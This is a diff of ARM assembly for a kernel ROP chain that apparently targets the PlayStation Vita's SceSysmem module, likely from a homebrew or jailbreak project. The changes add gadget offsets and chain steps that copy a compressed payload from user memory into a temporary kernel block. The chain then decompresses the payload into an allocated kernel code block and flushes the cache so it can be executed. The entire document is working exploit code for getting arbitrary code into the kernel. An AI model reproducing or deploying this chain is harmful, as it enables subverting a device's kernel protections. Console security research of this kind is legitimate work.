@@ -18,18 +18,18 @@
 
 // load
 .equ SceSysmem_pop_pc,                            0x347
-.equ SceSysmem_pop_r0_pc,                         0x31
+.equ SceSysmem_pop_r0_r1_pc,                      0x853
 .equ SceSysmem_pop_r0_r1_r2_r3_r4_pc,             0x258fd
 .equ SceSysmem_pop_r3_pc,                         0x1b4d
+.equ SceSysmem_pop_r3_r4_r5_pc,                   0x144b
 .equ SceSysmem_pop_r3_r4_r5_r6_r7_pc,             0x103f
 .equ SceSysmem_ldr_r0_r0_blx_r3,                  0xd51b
+.equ SceSysmem_ldr_r2_r5_14_blx_r3,               0x1f697
 
 // store
 .equ SceSysmem_str_r0_r4_movs_r0_0_pop_r4_pc,     0x163d
 
 // move
-.equ SceSysmem_mov_r2_r5_blx_r6,                  0x113d7
-.equ SceSysmem_movs_r5_r0_blx_r2,                 0xd30d
 .equ SceSysmem_mov_sp_r1_blx_r2,                  0x67
 
 // arithmetic
@@ -41,6 +41,8 @@
 .equ SceSysmem_ksceKernelGetMemBlockBase,         0x1f15
 .equ SceSysmem_ksceKernelAllocMemBlock,           0xa521
 .equ SceSysmem_ksceKernelRemapBlock,              0xa74d
+.equ SceSysmem_ksceKernelFreeMemBlock,            0xaa41
+.equ SceSysmem_ksceDeflateDecompress,             0x1c3bb
 .equ SceSysmem_ksceKernelMemcpyUserToKernel,      0x825d
 .equ SceSysmem_ksceKernelCpuDcacheWritebackRange, 0x22fcd
 
@@ -48,11 +50,13 @@
 .equ SceSysmem_empty_string,                      0x19
 
 // Variables that lie in the kernel stack
-.equ payload_code_block,                          0x00
-.equ payload_code_blockid,                        0x04
+.equ payload_temp_block,                          0x00
+.equ payload_temp_blockid,                        0x04
+.equ payload_code_block,                          0x08
+.equ payload_code_blockid,                        0x0c
 
-// Max payload size
-.equ MAX_PAYLOAD_SIZE,                            0x100000
+// Max decompressed payload size
+.equ PAYLOAD_DECOMPRESSED_SIZE,                   0x100000
 
 .macro init_krop dst
   .set krop_chain, \dst
@@ -75,16 +79,37 @@
   // Init krop chain
   init_krop \dst
 
+  // Allocate temporary block
+  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
+  push 1, SceSysmem_empty_string                      // r0
+  push 0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW          // r1
+  push 0, (payload_size + 0xfff) & ~0xfff             // r2
+  push 0, NULL                                        // r3
+  push 1, SceSysmem_ksceKernelAllocMemBlock           // r4
+  push 1, SceSysmem_blx_r4_pop_r4_pc                  // pc
+  push 2, payload_temp_blockid                        // r4
+  push 1, SceSysmem_str_r0_r4_movs_r0_0_pop_r4_pc     // pc
+  push 9, 0xDEADBEEF                                  // r4
+
+  // Get temporary block
+  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
+  push 2, payload_temp_blockid                        // r0
+  push 2, payload_temp_block                          // r1
+  push 9, 0xDEADBEEF                                  // r2
+  push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
+  push 1, SceSysmem_ksceKernelGetMemBlockBase         // r4
+  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
+  push 9, 0xDEADBEEF                                  // r4
+
   // Allocate code block
   push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
   push 1, SceSysmem_empty_string                      // r0
   push 0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW          // r1
-  push 0, MAX_PAYLOAD_SIZE                            // r2
+  push 0, PAYLOAD_DECOMPRESSED_SIZE                   // r2
   push 0, NULL                                        // r3
   push 1, SceSysmem_ksceKernelAllocMemBlock           // r4
   push 1, SceSysmem_blx_r4_pop_r4_pc                  // pc
   push 2, payload_code_blockid                        // r4
-  // Save code blockid
   push 1, SceSysmem_str_r0_r4_movs_r0_0_pop_r4_pc     // pc
   push 9, 0xDEADBEEF                                  // r4
 
@@ -98,13 +123,38 @@
   push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
   push 9, 0xDEADBEEF                                  // r4
 
-  // Copy payload from user to kernel code block
+  // Copy compressed payload from user to temporary block
   push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
-  push 2, payload_code_block                          // r0
+  push 2, payload_temp_block                          // r0
   push 0, payload_start                               // r1
   push 0, payload_size                                // r2
   push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
   push 1, SceSysmem_ksceKernelMemcpyUserToKernel      // r4
+  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
+  push 9, 0xDEADBEEF                                  // r4
+
+  // Decompress payload to code block
+  push 1, SceSysmem_pop_r3_r4_r5_pc                   // pc
+  push 1, SceSysmem_pop_pc                            // r3
+  push 1, SceSysmem_ksceDeflateDecompress             // r4
+  push 2, payload_temp_block - 0x14                   // r5
+  push 1, SceSysmem_ldr_r2_r5_14_blx_r3               // pc
+  push 1, SceSysmem_pop_r0_r1_pc                      // pc
+  push 2, payload_code_block                          // r0
+  push 0, PAYLOAD_DECOMPRESSED_SIZE                   // r1
+  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
+  push 1, SceSysmem_pop_r3_pc                         // pc
+  push 0, NULL                                        // r3
+  push 1, SceSysmem_blx_r4_pop_r4_pc                  // pc
+  push 9, 0xDEADBEEF                                  // r4
+
+  // Free temporary block
+  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
+  push 2, payload_temp_blockid                        // r0
+  push 9, 0xDEADBEEF                                  // r1
+  push 9, 0xDEADBEEF                                  // r2
+  push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
+  push 1, SceSysmem_ksceKernelFreeMemBlock            // r4
   push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
   push 9, 0xDEADBEEF                                  // r4
 
@@ -118,10 +168,10 @@
   push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
   push 9, 0xDEADBEEF                                  // r4
 
-  // Clean dcache
+  // Clean cache
   push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
   push 2, payload_code_block                          // r0
-  push 0, MAX_PAYLOAD_SIZE                            // r1
+  push 0, PAYLOAD_DECOMPRESSED_SIZE                   // r1
   push 9, 0xDEADBEEF                                  // r2
   push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
   push 1, SceSysmem_ksceKernelCpuDcacheWritebackRange // r4
